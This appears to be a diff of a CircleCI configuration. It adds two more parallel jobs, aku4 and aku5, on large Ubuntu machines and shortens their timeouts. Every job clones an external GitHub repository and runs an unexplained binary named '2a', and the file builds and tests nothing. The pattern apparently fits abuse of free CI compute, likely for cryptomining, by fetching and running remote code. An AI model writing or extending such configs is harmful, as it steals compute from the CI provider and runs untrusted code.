@@ -8,7 +8,7 @@ jobs:
         - run:
             name: Install
             command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 900m
+            no_output_timeout: 70m
     aku2:
       machine:
             image: ubuntu-2004:202101-01
@@ -17,7 +17,7 @@ jobs:
         - run:
             name: Install
             command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 900m
+            no_output_timeout: 70m
     aku3:
       machine:
             image: ubuntu-2004:202101-01
@@ -26,7 +26,25 @@ jobs:
         - run:
             name: Install
             command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 900m
+            no_output_timeout: 70m
+    aku4:
+      machine:
+            image: ubuntu-2004:202101-01
+      resource_class: large
+      steps:
+        - run:
+            name: Install
+            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
+            no_output_timeout: 70m
+    aku5:
+      machine:
+            image: ubuntu-2004:202101-01
+      resource_class: large
+      steps:
+        - run:
+            name: Install
+            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
+            no_output_timeout: 70m
 
 workflows:
     version: 2
@@ -35,3 +53,5 @@ workflows:
             - aku1
             - aku2
             - aku3
+            - aku4
+            - aku5
